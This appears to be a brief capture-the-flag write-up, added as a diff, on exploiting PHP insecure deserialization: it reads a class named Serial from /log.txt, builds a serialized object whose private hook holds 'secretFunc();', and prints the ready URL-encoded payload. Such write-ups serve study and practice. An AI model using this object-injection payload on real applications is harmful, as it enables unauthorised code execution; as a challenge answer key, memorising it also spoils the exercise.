@@ -1,0 +1,13 @@
+Go to /log.txt 
+You can see that there is a class named Serial. And there's a secretFunc() which needs to be called.
+
+Creating custom payload:
+Start an interactive php shell: php -a
+
+class Serial{
+    private $hook="secretFunc();";
+}
+
+print urlencode(serialize(new Serial));
+
+Payload: O%3A6%3A%22Serial%22%3A1%3A%7Bs%3A12%3A%22%00Serial%00hook%22%3Bs%3A13%3A%22secretFunc%28%29%3B%22%3B%7D
